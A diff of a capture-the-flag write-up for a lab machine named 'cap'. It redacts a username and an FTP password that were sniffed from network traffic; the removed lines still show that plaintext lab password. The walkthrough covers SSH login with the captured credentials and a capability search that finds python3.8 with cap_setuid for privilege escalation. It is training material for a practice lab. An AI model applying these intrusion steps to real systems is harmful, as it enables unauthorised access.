@@ -60,9 +60,9 @@ follow tcp stream on any packet
 
 ```
 220 (vsFTPd 3.0.3)
-USER nathan
+USER XXXX
 331 Please specify the password.
-PASS Buck3tH4TF0RM3!
+PASS XXXXXXXXX
 230 Login successful.
 SYST
 215 UNIX Type: L8
@@ -91,27 +91,28 @@ as we see it seems a user from the machine ip sent his credits unencrypted .
 
 now we have credits !
 =========================
+do it your self :)
 
-USER nathan
+USER XXXXXX
 
-PASS Buck3tH4TF0RM3!
+PASS XXXXXXXXXXXXXX
 
 [*]port 22 is open as we get from the nmap :) 
 
-$ssh nathan@10.10.10.245 
+$ssh XXXX@10.10.10.245 
 
 
 ==================WE ARE IN=====================
 
 
-### now we can go ahead and read /home/nathan/user.txt 
+### now we can go ahead and read /home/XXXX/user.txt 
 
 PRIVILEGE ESCALATION
 ====================
 
 $sudo -l 
 
-X no sudo for nathan :( 
+X no sudo for XXXX :( 
 
 some checks :
 -----------
@@ -141,7 +142,7 @@ Linux cap 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86
 
 searching for capabilites 
 ------------------------
-nathan@cap:/$ getcap -r / 2>/dev/null
+$ getcap -r / 2>/dev/null
 ```
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 /usr/bin/ping = cap_net_raw+ep
